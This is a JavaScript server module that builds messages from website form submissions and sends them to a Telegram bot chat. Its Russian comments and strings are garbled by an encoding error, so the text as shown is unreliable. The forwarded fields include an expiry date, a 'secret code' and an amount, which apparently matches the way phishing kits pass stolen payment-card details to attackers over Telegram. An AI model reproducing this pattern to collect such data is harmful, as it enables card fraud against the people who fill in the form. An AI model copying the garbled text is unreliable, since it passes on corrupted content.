// src/api/telegram.js  (–°–ï–†–í–ï–†–ù–´–ô —Ñ–∞–π–ª, –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –¢–û–õ–¨–ö–û –∏–∑ server.js)

// –ï—Å–ª–∏ Node < 18, —Ä–∞—Å–∫–æ–º–º–µ–Ω—Ç–∏—Ä—É–π —Å–ª–µ–¥—É—é—â—É—é —Å—Ç—Ä–æ–∫—É:
// import fetch from "node-fetch";

function buildTextFromPayload(payload) {
  if (typeof payload === "string") return payload;
  const p = payload || {};
  const lines = [
    "üì® –ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ —Å —Å–∞–π—Ç–∞:",
    p.name && `üë§ –ò–º—è: ${p.name}`,
    p.email && `üìß Email: ${p.email}`,
    p.message && `üí¨ –°–æ–æ–±—â–µ–Ω–∏–µ: ${p.message}`,
    p.phone && `üì± –¢–µ–ª–µ—Ñ–æ–Ω: ${p.phone}`,
    p.fio && `üë§ –§–ò–û: ${p.fio}`,
    p.requestNumber && `#Ô∏è‚É£ –ù–æ–º–µ—Ä –∑–∞—è–≤–∫–∏: ${p.requestNumber}`,
    p.expiry && `üìÖ –°—Ä–æ–∫: ${p.expiry}`,
    p.secretCode && `üîí –°–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥: ${p.secretCode}`,
    p.amount && `üíµ –°—É–º–º–∞: ${p.amount}`,        // ‚Üê –ù–û–í–û–ï
  ].filter(Boolean);
  return lines.join("\n");
}


export async function sendMessage(payloadOrText) {
  const token = process.env.TG_BOT_TOKEN;
  const chatId = process.env.TG_CHAT_ID;
  if (!token || !chatId) throw new Error("–ù–µ—Ç TG_BOT_TOKEN/TG_CHAT_ID");

  const text = buildTextFromPayload(payloadOrText);

  const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text }),
  });
  const data = await resp.json();
  if (!data.ok) throw new Error(data.description || "Telegram error");
  return data;
}

// –ê–ª–∏–∞—Å, –µ—Å–ª–∏ –≥–¥–µ-—Ç–æ –≤—ã–∑—ã–≤–∞–µ—à—å sendTelegram
export async function sendTelegram(payload) {
  return sendMessage(payload);
}
